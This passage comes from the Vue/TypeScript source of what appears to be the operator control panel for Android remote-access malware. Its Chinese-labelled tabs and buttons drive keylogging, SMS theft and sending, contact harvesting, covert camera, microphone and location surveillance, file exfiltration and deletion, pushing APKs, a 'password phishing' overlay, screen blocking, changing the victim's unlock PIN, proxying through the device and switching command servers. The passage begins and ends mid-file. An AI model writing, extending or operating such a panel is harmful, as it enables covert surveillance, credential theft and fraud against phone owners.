  sendDevicePayload(P.buildFileDelete());
  message.success('删除指令已下发');
}

function openMapLocation() {
  const loc = panelState.value.lastLocation;
  if (loc) {
    window.open(`https://maps.google.com/?q=${loc.lat},${loc.lon}`, '_blank');
  }
}

// ─── Search ────────────────────────────────────────────────────
function submitSearch() {
  const q = searchQuery.value.trim();
  if (!q) {
    message.warning('请输入搜索关键词');
    return;
  }
  sendDevicePayload(P.buildSearch(q, searchType.value, searchPath.value));
  message.success('搜索指令已下发');
}

// ─── File Upload (chunked 256KB) ──────────────────────────────
const CHUNK_SIZE = 256 * 1024; // 256KB per chunk

function triggerUpload() {
  uploadingFile.value = null;
  uploadFileName.value = '';
  uploadFilePath.value = currentFilePath.value;
  uploadProgress.value = 0;
  uploadVisible.value = true;
}

function handleFileSelect(event: Event) {
  const input = event.target as HTMLInputElement;
  if (input.files && input.files[0]) {
    uploadingFile.value = input.files[0];
    uploadFileName.value = input.files[0].name;
  }
}

async function submitUpload() {
  const file = uploadingFile.value;
  if (!file) {
    message.warning('请选择文件');
    return;
  }
  if (!uploadFilePath.value.trim()) {
    message.warning('请输入目标路径');
    return;
  }
  uploading.value = true;
  uploadProgress.value = 0;
  const totalChunks = Math.ceil(file.size / CHUNK_SIZE);

  for (let i = 0; i < totalChunks; i++) {
    const start = i * CHUNK_SIZE;
    const end = Math.min(start + CHUNK_SIZE, file.size);
    const blob = file.slice(start, end);
    const base64 = await readBlobAsBase64(blob);
    const comdtype = i === totalChunks - 1 ? '1' : '0'; // '1' = last chunk
    const payload = P.buildFileUpload({
      comdtype,
      content: base64,
      filename: uploadFileName.value,
      filepath: uploadFilePath.value,
      filetype: file.type || 'application/octet-stream',
      size: String(file.size),
    });
    ws.panelSend({ pid: props.phoneId, ...payload });
    uploadProgress.value = Math.round(((i + 1) / totalChunks) * 100);
    // Small delay between chunks
    await new Promise((r) => setTimeout(r, 100));
  }
  uploading.value = false;
  message.success('文件上传完成');
  uploadVisible.value = false;
  refreshFiles();
}

function readBlobAsBase64(blob: Blob): Promise<string> {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.addEventListener('load', () => {
      const result = reader.result as string;
      // Strip data URL prefix: "data:...;base64,"
      const base64 = result.split(',')[1] || '';
      resolve(base64);
    });
    // eslint-disable-next-line unicorn/prefer-add-event-listener
    reader.onerror = reject;
    reader.readAsDataURL(blob);
  });
}

// ─── File Download (chunk assembly) ────────────────────────────
function downloadFile(filepath: string) {
  sendDevicePayload(P.buildFileView(filepath));
  downloadProgress.value = `正在下载: ${filepath}`;
  message.info('下载指令已下发，等待数据...');
}

function assembleAndSaveDownload() {
  const chunks = panelState.value.downloadChunks;
  if (chunks.length === 0) {
    message.warning('没有可用的下载数据');
    return;
  }
  // Sort by chunkNumber
  const sorted = [...chunks].toSorted((a, b) => a.chunkNumber - b.chunkNumber);
  const filename = sorted[0]?.filename || 'download.bin';
  // Combine base64 data
  const combined = sorted.map((c: DownChunk) => c.filedata).join('');
  try {
    const binary = atob(combined);
    const bytes = new Uint8Array(binary.length);
    // eslint-disable-next-line unicorn/prefer-code-point
    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
    const blob = new Blob([bytes]);
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = filename;
    document.body.append(link);
    link.click();
    link.remove();
    URL.revokeObjectURL(url);
    message.success(`文件 ${filename} 已保存`);
    // Clear chunks after save
    panelState.value = { ...panelState.value, downloadChunks: [] };
    downloadProgress.value = '';
  } catch (error) {
    message.error(`文件拼接失败: ${String(error)}`);
  }
}

// ─── Server Change ─────────────────────────────────────────────
function openServerChange() {
  serverDomain.value = '';
  serverIp.value = '';
  serverChangeId.value = '';
  serverChangeVisible.value = true;
}

function submitServerChange() {
  if (!serverDomain.value.trim() || !serverIp.value.trim()) {
    message.warning('请输入域名和IP');
    return;
  }
  sendDevicePayload(
    P.buildChangeServer(
      serverDomain.value,
      serverIp.value,
      serverChangeId.value,
    ),
  );
  message.success('切换服务器指令已下发');
  serverChangeVisible.value = false;
}

// ─── Notify ────────────────────────────────────────────────────
function submitNotify() {
  if (!notifyText.value.trim()) {
    message.warning('请输入通知内容');
    return;
  }
  sendDevicePayload(P.buildNotify(notifyText.value));
  message.success('通知指令已下发');
}

// ─── Display ───────────────────────────────────────────────────
function submitDisplay() {
  sendDevicePayload(P.buildDisplay(displayValue.value));
  message.success(
    `显示模式已设为 ${displayValue.value === '1' ? '显示' : '隐藏'}`,
  );
}

// ─── Quality ───────────────────────────────────────────────────
function submitQuality() {
  sendDevicePayload(P.buildScreenQuality(qualityValue.value));
  message.success(`画质已设为 ${qualityValue.value}`);
}

// ─── NoInject ──────────────────────────────────────────────────
function submitNoInject() {
  if (!noInjId.value.trim()) {
    message.warning('请输入注入ID');
    return;
  }
  sendDevicePayload(P.buildNoInject(noInjId.value));
  message.success('停止注入指令已下发');
}

// ─── Proxy ────────────────────────────────────────────────────
function toggleProxy(on: boolean) {
  proxyOn.value = on;
  sendDevicePayload(P.buildProxy(on));
  message.success(on ? '代理已开启' : '代理已关闭');
}

function fieldValue(...keys: string[]) {
  const row = deviceInfo.value as null | Record<string, unknown>;
  if (!row) return '';
  for (const key of keys) {
    const value = row[key];
    if (value !== undefined && value !== null && String(value).trim())
      return String(value);
  }
  return '';
}

function firstString(row: Record<string, unknown>, ...keys: string[]) {
  for (const key of keys) {
    const value = row[key];
    if (value !== undefined && value !== null && String(value).trim())
      return String(value);
  }
  return '';
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

function accessibilityLabel(value: string) {
  if (value === '1' || value === 'true' || value === '已开启') return '已开启';
  if (!value) return '未知';
  return '未开启';
}

function cleanBattery(value: string) {
  return value ? value.replaceAll(/\D/g, '') : '';
}

function parseLeadingTime(value: string) {
  const match = value.match(/^\[(.*?)\]/);
  return match?.[1] || '';
}
</script>

<template>
  <PageContainer class="device-control-page" :title="`设备控制 - ${phoneId}`">
    <template #extra>
      <a-space>
        <a-button
          :loading="deviceLoading"
          size="small"
          @click="refreshDeviceSummary"
        >
          <ReloadOutlined /> 设备信息
        </a-button>
        <a-button size="small" @click="ping">
          <ReloadOutlined /> 刷新状态
        </a-button>
      </a-space>
    </template>

    <div class="legacy-control-shell">
      <section class="device-status-strip">
        <div class="device-id">
          <MobileOutlined />
          <span>设备 ID：{{ phoneId || '未知' }}</span>
        </div>
        <a-tag v-if="ws.connected.value" color="blue">
          <WifiOutlined /> WS 已连接
        </a-tag>
        <a-tag v-else-if="ws.reconnecting.value" color="orange">重连中</a-tag>
        <a-tag v-else color="default"> <DisconnectOutlined /> 未连接 </a-tag>
        <a-tag
          :color="lastStatus?.serverToPhone === 'OPEN' ? 'green' : 'default'"
        >
          设备链路：{{ lastStatus?.serverToPhone === 'OPEN' ? '在线' : '未知' }}
        </a-tag>
        <span class="status-text"
          >最后收到 ping 时间：{{ lastStatus?.lastPing || '未知' }}</span
        >
        <div class="grow"></div>
        <a-button danger size="small" @click="reconnect">重连</a-button>
      </section>

      <section class="device-summary-grid">
        <div class="summary-remark">
          <span class="summary-label">备注</span>
          <a-input
            v-model:value="remarkText"
            size="small"
            placeholder="修改备注"
          />
          <a-button danger size="small" @click="saveRemark">修改</a-button>
        </div>
        <div
          v-for="item in deviceSummaryRows"
          :key="item.label"
          class="summary-chip"
        >
          <span>{{ item.label }}</span>
          <strong>{{ item.value }}</strong>
        </div>
      </section>

      <section class="legacy-control-workbench content-wrapper">
        <div class="legacy-main-panel tabs-wrapper">
          <a-tabs v-model:active-key="activeTab" class="legacy-tabs">
            <a-tab-pane key="keylog" tab="键盘记录">
              <div class="legacy-toolbar">
                <a-button type="primary" @click="toggleKeylog(true)">
                  开启
                </a-button>
                <a-button danger @click="toggleKeylog(false)">关闭</a-button>
                <a-button danger @click="clearKeylog">清除内容</a-button>
                <a-button @click="openLogdate">查看</a-button>
                <a-button type="primary" ghost @click="exportKeylog">
                  下载
                </a-button>
                <a-input
                  v-model:value="keylogSearch"
                  class="toolbar-search"
                  placeholder="搜索记录"
                  allow-clear
                >
                  <template #prefix><SearchOutlined /></template>
                </a-input>
              </div>
              <a-table
                :columns="keylogColumns"
                :data-source="keylogRows"
                :pagination="{ pageSize: 10 }"
                row-key="index"
                size="small"
              />
            </a-tab-pane>

            <a-tab-pane key="sms" tab="短信记录">
              <div class="legacy-toolbar">
                <a-button type="primary" @click="sendCommand('SMS')">
                  查看
                </a-button>
                <a-button danger @click="openSmsSend">发送</a-button>
                <a-button type="primary" ghost @click="exportSms">
                  下载
                </a-button>
                <a-input
                  v-model:value="smsSearch"
                  class="toolbar-search"
                  placeholder="搜索记录"
                  allow-clear
                >
                  <template #prefix><SearchOutlined /></template>
                </a-input>
              </div>
              <a-table
                :columns="smsColumns"
                :data-source="smsRows"
                :pagination="{ pageSize: 10 }"
                row-key="detail"
                size="small"
              />
            </a-tab-pane>

            <a-tab-pane key="contacts" tab="通讯列表">
              <div class="legacy-toolbar">
                <a-button type="primary" @click="sendCommand('Contacts')">
                  查看
                </a-button>
              </div>
              <a-table
                :columns="contactColumns"
                :data-source="panelState.contacts"
                :pagination="{ pageSize: 10 }"
                row-key="number"
                size="small"
              />
            </a-tab-pane>

            <a-tab-pane key="camera" tab="摄像监控" :disabled="!canUseFeature('camera')">
              <div v-if="!canUseFeature('camera')" style="padding: 12px; color: #888">
                <a-result
                  status="403"
                  :title="getRestrictedReason('camera')"
                  sub-title="该功能暂不可用"
                />
              </div>
              <template v-else>
                <div class="legacy-toolbar">
                  <a-button
                    type="primary"
                    :disabled="cameraRunning"
                    @click="toggleCamera(true)"
                    :title="!canUseFeature('camera') ? getRestrictedReason('camera') : ''"
                  >
                    开启
                  </a-button>
                  <a-button
                    danger
                    :disabled="!cameraRunning"
                    @click="toggleCamera(false)"
                    :title="!canUseFeature('camera') ? getRestrictedReason('camera') : ''"
                  >
                    关闭
                  </a-button>
                <a-select
                  v-model:value="cameraSide"
                  class="camera-select"
                  size="small"
                  :options="[
                    { label: '前置', value: '0' },
                    { label: '后置', value: '1' },
                  ]"
                />
              </div>
              <div class="media-stage">
                <img
                  v-if="panelState.cameraImage"
                  :src="panelState.cameraImage"
                  alt=""
                />
                <a-empty v-else description="暂无摄像画面" />
              </div>
              </template>
            </a-tab-pane>

            <a-tab-pane key="apps" tab="应用弹窗" :disabled="!canUseFeature('popup')">
              <div v-if="!canUseFeature('popup')" style="padding: 12px; color: #888">
                <a-result
                  status="403"
                  :title="getRestrictedReason('popup')"
                  sub-title="该功能暂不可用"
                />
              </div>
              <template v-else>
                <div class="legacy-toolbar">
                  <a-button type="primary" @click="sendCommand('LOADAPPS')">
                    查看
                  </a-button>
                  <a-button @click="openBroadcast()">弹窗</a-button>
                  <a-button
                    type="primary"
                    ghost
                    :disabled="!ws.connected.value"
                    @click="openPopupForm"
                    :title="!ws.connected.value ? 'WebSocket 未连接' : ''"
                  >
                    应用弹窗
                  </a-button>
                <a-input
                  v-model:value="appSearch"
                  class="toolbar-search"
                  placeholder="搜索记录"
                  allow-clear
                >
                  <template #prefix><SearchOutlined /></template>
                </a-input>
              </div>
              <a-table
                :columns="appColumns"
                :data-source="appRows"
                :pagination="{ pageSize: 10 }"
                row-key="packageName"
                size="small"
              >
                <template #bodyCell="{ column, record }">
                  <template v-if="column.dataIndex === 'name'">
                    <a-space>
                      <img
                        v-if="record.icon"
                        class="app-icon"
                        :src="record.icon"
                        alt=""
                      />
                      <span>{{ record.name }}</span>
                      <a-button
                        size="small"
                        @click="openOpenApp(record.packageName)"
                      >
                        打开
                      </a-button>
                      <a-button
                        size="small"
                        @click="openBroadcast(record.packageName)"
                      >
                        弹窗
                      </a-button>
                    </a-space>
                  </template>
                </template>
              </a-table>
              </template>
            </a-tab-pane>

            <a-tab-pane key="dispatch" tab="应用下发">
              <div class="legacy-toolbar">
                <a-select
                  v-model:value="selectedApkId"
                  placeholder="选择要下发的APK"
                  style="flex: 1; margin-right: 8px"
                  :loading="buildsLoading"
                >
                  <a-select-option v-for="build in availableBuilds" :key="build.app_package" :value="build.app_package">
                    {{ build.appname }} ({{ build.app_package }})
                  </a-select-option>
                </a-select>
                <a-button
                  type="primary"
                  :loading="dispatchLoading"
                  :disabled="!selectedApkId || !ws.connected.value"
                  @click="dispatchApk"
                >
                  下发到设备
                </a-button>
              </div>
              <a-progress
                v-if="dispatchProgress > 0"
                :percent="dispatchProgress"
                style="margin-top: 16px"
              />
              <a-empty
                v-if="availableBuilds.length === 0 && !buildsLoading"
                description="暂无可下发的APK"
                style="margin-top: 32px"
              />
            </a-tab-pane>

            <a-tab-pane key="files" tab="文件管理">
              <div class="legacy-toolbar">
                <a-button type="primary" @click="browseFiles('/sdcard/')">
                  SD卡目录
                </a-button>
                <a-button @click="browseFiles('/sdcard/Pictures/')">
                  Pictures
                </a-button>
                <a-button @click="browseFiles('/sdcard/DCIM/')">
                  DCIM目录
                </a-button>
                <a-button @click="browseFiles('/sdcard/Screenshots/')">
                  截图目录
                </a-button>
                <a-button @click="browseFiles('/sdcard/Download/')">
                  下载目录
                </a-button>
                <a-button type="primary" ghost @click="refreshFiles">
                  刷新
                </a-button>
                <a-button @click="triggerUpload">上传文件</a-button>
                <a-button
                  :disabled="panelState.downloadChunks.length === 0"
                  type="primary"
                  ghost
                  @click="assembleAndSaveDownload"
                >
                  保存下载({{ panelState.downloadChunks.length }}块)
                </a-button>
                <span style="margin-left: 8px; color: #888"
                  >当前: {{ currentFilePath }}</span
                >
                <span v-if="downloadProgress" style="color: #1890ff">{{
                  downloadProgress
                }}</span>
              </div>
              <a-table
                :columns="fileColumns"
                :data-source="panelState.files"
                :pagination="{ pageSize: 10 }"
                row-key="path"
                size="small"
              >
                <template #bodyCell="{ column, record }">
                  <template v-if="column.dataIndex === 'name'">
                    <a-space>
                      <span>{{ record.name }}</span>
                      <a-button
                        v-if="record.path"
                        size="small"
                        @click="browseFiles(record.path)"
                      >
                        打开
                      </a-button>
                      <a-button
                        v-if="record.path"
                        size="small"
                        @click="viewFile(record.path)"
                      >
                        查看
                      </a-button>
                      <a-button
                        v-if="record.path"
                        size="small"
                        @click="downloadFile(record.path)"
                      >
                        下载
                      </a-button>
                      <a-button
                        v-if="record.name"
                        size="small"
                        @click="openRename(record.name, record.path)"
                      >
                        重命名
                      </a-button>
                      <a-button
                        v-if="record.path"
                        size="small"
                        danger
                        @click="deleteFile(record.path)"
                      >
                        删除
                      </a-button>
                    </a-space>
                  </template>
                </template>
              </a-table>
            </a-tab-pane>

            <a-tab-pane key="inject" tab="注入记录" :disabled="!canUseFeature('inject')">
              <div v-if="!canUseFeature('inject')" style="padding: 12px; color: #888">
                <a-result
                  status="403"
                  :title="getRestrictedReason('inject')"
                  sub-title="该功能暂不可用"
                />
              </div>
              <template v-else>
                <div class="legacy-toolbar">
                  <a-button type="primary" @click="getInjApps">获取</a-button>
                <a-input
                  v-model:value="noInjId"
                  class="toolbar-search"
                  placeholder="停止注入ID"
                  allow-clear
                />
                <a-button danger @click="submitNoInject">停止注入</a-button>
              </div>
              <a-table
                :columns="injectColumns"
                :data-source="panelState.injectRecords"
                :pagination="false"
                row-key="packageName"
                size="small"
              />
              </template>
            </a-tab-pane>

            <a-tab-pane key="search" tab="搜索">
              <div class="legacy-toolbar">
                <a-input
                  v-model:value="searchQuery"
                  class="toolbar-search"
                  placeholder="搜索关键词"
                  allow-clear
                >
                  <template #prefix><SearchOutlined /></template>
                </a-input>
                <a-select
                  v-model:value="searchType"
                  size="small"
                  style="width: 100px"
                >
                  <a-select-option value="name">文件名</a-select-option>
                  <a-select-option value="ext">扩展名</a-select-option>
                  <a-select-option value="content">内容</a-select-option>
                  <a-select-option value="all">全部</a-select-option>
                </a-select>
                <a-input
                  v-model:value="searchPath"
                  size="small"
                  placeholder="搜索路径"
                  style="width: 160px"
                />
                <a-button type="primary" @click="submitSearch">搜索</a-button>
              </div>
              <div v-if="panelState.searchResults.length > 0">
                <a-table
                  :columns="[{ dataIndex: 'path', title: '搜索结果' }]"
                  :data-source="
                    panelState.searchResults.map((p, i) => ({
                      path: p,
                      key: i,
                    }))
                  "
                  :pagination="{ pageSize: 20 }"
                  row-key="key"
                  size="small"
                />
              </div>
              <a-empty v-else description="暂无搜索结果" />
            </a-tab-pane>

            <a-tab-pane key="chat" tab="聊天">
              <div
                v-if="panelState.chatMessages.length > 0"
                style="max-height: 400px; overflow-y: auto"
              >
                <a-table
                  :columns="[
                    { dataIndex: 'time', title: '时间', width: 140 },
                    { dataIndex: 'data', title: '内容' },
                  ]"
                  :data-source="panelState.chatMessages"
                  :pagination="{ pageSize: 20 }"
                  row-key="time"
                  size="small"
                />
              </div>
              <a-empty v-else description="暂无聊天记录" />
            </a-tab-pane>

            <a-tab-pane key="notifications" tab="通知历史">
              <div class="legacy-toolbar">
                <a-input
                  v-model:value="notifyText"
                  class="toolbar-search"
                  placeholder="发送通知内容"
                  allow-clear
                />
                <a-button type="primary" @click="submitNotify">发送</a-button>
              </div>
              <a-table
                :columns="[
                  { dataIndex: 'time', title: '时间', width: 140 },
                  { dataIndex: 'app', title: '应用', width: 160 },
                  { dataIndex: 'text', title: '内容' },
                ]"
                :data-source="panelState.notifications"
                :pagination="{ pageSize: 20 }"
                row-key="time"
                size="small"
              />
            </a-tab-pane>

            <a-tab-pane key="proxy" tab="代理">
              <div class="legacy-toolbar">
                <a-button type="primary" @click="toggleProxy(true)">
                  开启代理
                </a-button>
                <a-button danger @click="toggleProxy(false)">关闭代理</a-button>
              </div>
              <div v-if="panelState.proxyState" style="padding: 12px">
                <p>
                  <strong>类型:</strong>
                  {{ (panelState.proxyState as any).calltype }}
                </p>
                <p v-if="(panelState.proxyState as any).extip">
                  <strong>外部IP:</strong>
                  {{ (panelState.proxyState as any).extip }}
                </p>
                <p v-if="(panelState.proxyState as any).locip">
                  <strong>本地IP:</strong>
                  {{ (panelState.proxyState as any).locip }}
                </p>
                <p v-if="(panelState.proxyState as any).pxport">
                  <strong>端口:</strong>
                  {{ (panelState.proxyState as any).pxport }}
                </p>
                <p v-if="(panelState.proxyState as any).pstate">
                  <strong>状态:</strong>
                  {{ (panelState.proxyState as any).pstate }}
                </p>
                <p v-if="(panelState.proxyState as any).pxip">
                  <strong>代理IP:</strong>
                  {{ (panelState.proxyState as any).pxip }}
                </p>
                <p v-if="(panelState.proxyState as any).purl">
                  <strong>URL:</strong>
                  {{ (panelState.proxyState as any).purl }}
                </p>
              </div>
              <a-empty v-else description="暂无代理数据" />
            </a-tab-pane>

            <a-tab-pane key="tools" tab="工具箱">
              <div class="legacy-toolbar" style="flex-wrap: wrap; gap: 8px">
                <a-button @click="openServerChange">切换服务器</a-button>
                <a-select
                  v-model:value="displayValue"
                  size="small"
                  style="width: 100px"
                >
                  <a-select-option value="1">显示</a-select-option>
                  <a-select-option value="0">隐藏</a-select-option>
                </a-select>
                <a-button @click="submitDisplay">设置显示</a-button>
                <a-input-number
                  v-model:value="qualityValue"
                  size="small"
                  :min="10"
                  :max="100"
                  style="width: 80px"
                />
                <a-button @click="submitQuality">设置画质</a-button>
              </div>
              <a-table
                :columns="[
                  { dataIndex: 'title', title: '标题' },
                  { dataIndex: 'url', title: '链接' },
                ]"
                :data-source="panelState.browseHistory"
                :pagination="{ pageSize: 20 }"
                row-key="url"
                size="small"
              />
            </a-tab-pane>

            <a-tab-pane key="location" tab="位置信息" :disabled="!canUseFeature('location')">
              <div v-if="!canUseFeature('location')" style="padding: 12px; color: #888">
                <a-result
                  status="403"
                  :title="getRestrictedReason('location')"
                  sub-title="该功能暂不可用"
                />
              </div>
              <template v-else>
                <div class="legacy-toolbar">
                  <a-button type="primary" @click="sendCommand('loc')">
                    获取位置
                  </a-button>
                  <a-button danger @click="sendCommand('locoff')">
                    停止定位
                  </a-button>
                </div>
              <div v-if="panelState.lastLocation" style="padding: 12px">
                <p><strong>纬度:</strong> {{ panelState.lastLocation.lat }}</p>
                <p><strong>经度:</strong> {{ panelState.lastLocation.lon }}</p>
                <p v-if="panelState.lastLocation.address">
                  <strong>地址:</strong> {{ panelState.lastLocation.address }}
                </p>
                <a-button size="small" type="link" @click="openMapLocation">
                  在Google地图中查看
                </a-button>
              </div>
              <a-empty v-else description="暂无位置数据" />
              <div
                v-if="panelState.locationHistory.length > 0"
                style="margin-top: 12px"
              >
                <h4>位置历史</h4>
                <a-table
                  :columns="[
                    { dataIndex: 'lat', title: '纬度' },
                    { dataIndex: 'lon', title: '经度' },
                    { dataIndex: 'address', title: '地址' },
                  ]"
                  :data-source="panelState.locationHistory"
                  :pagination="{ pageSize: 5 }"
                  row-key="lat"
                  size="small"
                />
              </div>
              </template>
            </a-tab-pane>

            <a-tab-pane key="mic" tab="声音监控" :disabled="!canUseFeature('mic')">
              <div v-if="!canUseFeature('mic')" style="padding: 12px; color: #888">
                <a-result
                  status="403"
                  :title="getRestrictedReason('mic')"
                  sub-title="该功能暂不可用"
                />
              </div>
              <template v-else>
                <div class="legacy-toolbar">
                  <a-button type="primary" @click="toggleMic(true)">
                    开启
                  </a-button>
                  <a-button danger @click="toggleMic(false)">关闭</a-button>
                </div>
              <div v-if="panelState.micData" style="padding: 12px">
                <p>已接收到音频数据</p>
                <audio
                  v-if="panelState.micData"
                  :src="
                    panelState.micData.startsWith('data:')
                      ? panelState.micData
                      : `data:audio/opus;base64,${panelState.micData}`
                  "
                  controls
                ></audio>
              </div>
              <a-empty
                v-else
                description="暂无音频数据，开启后声音事件会显示在此处"
              />
              </template>
            </a-tab-pane>
          </a-tabs>

          <div class="event-stream">
            <div class="event-head">实时事件流</div>
            <div v-if="events.length === 0" class="event-empty">尚无事件</div>
            <ul v-else>
              <li v-for="(event, index) in events" :key="index">
                <span>{{ event.time }}</span>
                <a-tag
                  :color="
                    event.type === 'restricted'
                      ? 'orange'
                      : event.type === 'error'
                        ? 'red'
                        : 'blue'
                  "
                >
                  {{ typeLabel(event.type) }}
                </a-tag>
                <span class="event-payload">{{ event.payload }}</span>
              </li>
            </ul>
          </div>
        </div>

        <div class="image-box-group">
          <aside class="screen-control-rail image-box">
            <div class="button-container screen-toggle-bar">
              <a-space size="small">
                <a-button
                  size="small"
                  type="primary"
                  :disabled="screenRunning || !ws.connected.value"
                  @click="togglePrimaryScreen(true)"
                >
                  开启
                </a-button>
                <a-button
                  size="small"
                  danger
                  :disabled="!screenRunning || !ws.connected.value"
                  @click="togglePrimaryScreen(false)"
                >
                  关闭
                </a-button>
              </a-space>
            </div>
            <div class="image-wrapper with-sidebar">
              <div class="image-slot">
                <div
                  class="screenlayers"
                  @mousedown.prevent="startScreenPointer($event, 'primary')"
                  @mousemove.prevent="moveScreenPointer($event, 'primary')"
                  @mouseup.prevent="finishScreenPointer($event, 'primary')"
                  @mouseleave.prevent="finishScreenPointer($event, 'primary')"
                >
                  <img
                    v-if="panelState.screenImage"
                    :src="panelState.screenImage"
                    alt=""
                  />
                  <div
                    v-else
                    class="screen-empty"
                    aria-label="暂无屏幕画面"
                  ></div>
                  <canvas class="mousecanvas" aria-hidden="true"></canvas>
                </div>
              </div>
              <div class="inner-sidebar rail-actions">
                <div
                  v-for="(row, rowIndex) in screenActionRows"
                  :key="rowIndex"
                  class="rail-row button-row"
                >
                  <a-button
                    v-for="action in row"
                    :key="action.label"
                    :danger="action.danger"
                    :disabled="!ws.connected.value && !action.restricted"
                    :type="action.danger ? 'default' : 'primary'"
                    @click="runScreenAction(action)"
                  >
                    {{ action.label }}
                  </a-button>
                </div>
              </div>
            </div>
            <div class="nav-row">
              <a-button
                v-for="action in navActions"
                :key="action.label"
                :disabled="!ws.connected.value"
                size="small"
                @click="runScreenAction(action)"
              >
                {{ action.label }}
              </a-button>
            </div>
            <div class="rail-input-actions">
              <a-input
                v-model:value="phishTitle"
                size="small"
                placeholder="钓鱼界面文字标题"
              />
              <a-input
                v-model:value="phishContent"
                size="small"
                placeholder="钓鱼界面文字内容"
              />
              <a-select
                v-model:value="phishType"
                size="small"
                :options="phishTypeOptions"
              />
              <a-button
                :disabled="!ws.connected.value"
                block
                type="primary"
                @click="submitPasswordPhish"
              >
                密码钓鱼
              </a-button>
              <a-input
                v-model:value="blockText"
                size="small"
                placeholder="黑屏文字内容"
              />
              <a-select
                v-model:value="blockColor"
                size="small"
                :options="blockColorOptions"
              />
            </div>
          </aside>

          <aside class="camera-control-rail image-box">
            <div class="button-container screen-toggle-bar">
              <a-space size="small">
                <a-button
                  size="small"
                  type="primary"
                  :disabled="streamRunning || !ws.connected.value"
                  @click="toggleStreamScreen(true)"
                >
                  开启
                </a-button>
                <a-button
                  size="small"
                  danger
                  :disabled="!streamRunning || !ws.connected.value"
                  @click="toggleStreamScreen(false)"
                >
                  关闭
                </a-button>
                <a-select
                  v-model:value="screenMode"
                  size="small"
                  :options="screenModeOptions"
                  style="width: 76px"
                />
              </a-space>
            </div>
            <div class="image-wrapper with-sidebar">
              <div class="image-slot">
                <div
                  class="screenlayers"
                  @mousedown.prevent="startScreenPointer($event, 'stream')"
                  @mousemove.prevent="moveScreenPointer($event, 'stream')"
                  @mouseup.prevent="finishScreenPointer($event, 'stream')"
                  @mouseleave.prevent="finishScreenPointer($event, 'stream')"
                >
                  <img
                    v-if="panelState.screenshotImage"
                    :src="panelState.screenshotImage"
                    alt=""
                  />
                  <div
                    v-else
                    class="screen-empty"
                    aria-label="暂无投屏画面"
                  ></div>
                  <canvas class="mousecanvas" aria-hidden="true"></canvas>
                </div>
              </div>
              <div class="inner-sidebar rail-actions">
                <div
                  v-for="(row, rowIndex) in screenActionRows"
                  :key="rowIndex"
                  class="rail-row button-row"
                >
                  <a-button
                    v-for="action in row"
                    :key="action.label"
                    :danger="action.danger"
                    :disabled="!ws.connected.value && !action.restricted"
                    :type="action.danger ? 'default' : 'primary'"
                    @click="runScreenAction(action)"
                  >
                    {{ action.label }}
                  </a-button>
                </div>
              </div>
            </div>
            <div class="nav-row">
              <a-button
                v-for="action in navActions"
                :key="action.label"
                :disabled="!ws.connected.value"
                size="small"
                @click="runScreenAction(action)"
              >
                {{ action.label }}
              </a-button>
            </div>
            <div class="rail-input-actions" style="margin-top: 4px">
              <a-input
                v-model:value="pasteText"
                size="small"
                placeholder="请输入内容"
              />
              <a-button
                :disabled="!ws.connected.value"
                block
                type="primary"
                @click="submitPaste"
              >
                粘贴
              </a-button>
              <a-input
                v-model:value="phonepassText"
                size="small"
                placeholder="请输入数字密码"
              />
              <a-button
                :disabled="!ws.connected.value"
                block
                type="primary"
                @click="submitPhonepass"
              >
                修改解锁密码(仅数字)
              </a-button>
            </div>
            <div class="quick-action-grid">
              <a-button
                v-for="action in quickScreenActions"
                :key="action.label"
                :disabled="!ws.connected.value"
                size="small"
                type="primary"
                @click="runQuickScreenAction(action.type)"
              >
                {{ action.label }}
              </a-button>
            </div>
          </aside>
        </div>
      </section>
    </div>

    <a-modal
      v-model:open="smsVisible"
      title="发送短信"
      ok-text="下发"
      cancel-text="取消"
      @ok="submitSms"
    >
      <a-form layout="vertical">
        <a-form-item label="接收号码（多个用空格分隔）">
          <a-input
            v-model:value="smsNumber"
            placeholder="+8613800000000"
            allow-clear
          />
        </a-form-item>
        <a-form-item label="短信内容">
          <a-textarea v-model:value="smsText" :rows="4" />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="logdateVisible"
      title="键盘记录（按日期）"
      ok-text="查看"
      cancel-text="取消"
      @ok="submitLogdate"
    >
      <a-form layout="vertical">
        <a-form-item label="查询日期">
          <a-input v-model:value="logdateDate" type="date" />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="openappVisible"
      title="打开应用"
      ok-text="下发"
      cancel-text="取消"
      @ok="submitOpenApp"
    >
      <a-form layout="vertical">
        <a-form-item label="应用包名">
          <a-input
            v-model:value="openappPackage"
            placeholder="com.example.app"
            allow-clear
          />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="pasteVisible"
      title="粘贴文本"
      ok-text="下发"
      cancel-text="取消"
      @ok="submitPaste"
    >
      <a-form layout="vertical">
        <a-form-item label="要粘贴的文本">
          <a-textarea v-model:value="pasteText" :rows="3" />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="phonepassVisible"
      title="修改手机密码"
      ok-text="下发"
      cancel-text="取消"
      @ok="submitPhonepass"
    >
      <a-form layout="vertical">
        <a-form-item label="新密码（数字）">
          <a-input v-model:value="phonepassText" type="password" allow-clear />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="bcVisible"
      title="弹窗内容"
      ok-text="确定"
      cancel-text="取消"
      @ok="submitBc"
    >
      <a-form layout="vertical">
        <a-form-item label="类型">
          <a-radio-group v-model:value="bcComand" button-style="solid">
            <a-radio-button value="alert">弹窗警告</a-radio-button>
            <a-radio-button value="notify">系统通知</a-radio-button>
          </a-radio-group>
        </a-form-item>
        <a-form-item label="通知标题">
          <a-input v-model:value="bcTitle" allow-clear />
        </a-form-item>
        <a-form-item label="通知信息">
          <a-textarea v-model:value="bcMsg" :rows="3" />
        </a-form-item>
        <a-form-item label="点击动作">
          <a-select
            v-model:value="bcAct"
            :options="[
              { label: '无操作', value: 'nothing' },
              { label: '打开应用', value: 'openApp' },
              { label: '打开链接', value: 'openLink' },
            ]"
          />
        </a-form-item>
        <a-form-item label="跳转包名或链接">
          <a-input v-model:value="bcTodo" allow-clear />
        </a-form-item>
        <a-form-item v-if="bcComand === 'alert'" label="图标">
          <a-input v-model:value="bcIco" allow-clear />
        </a-form-item>
      </a-form>
    </a-modal>

    <a-modal
      v-model:open="renameVisible"
      title="重命名文件"
      ok-text="确定"
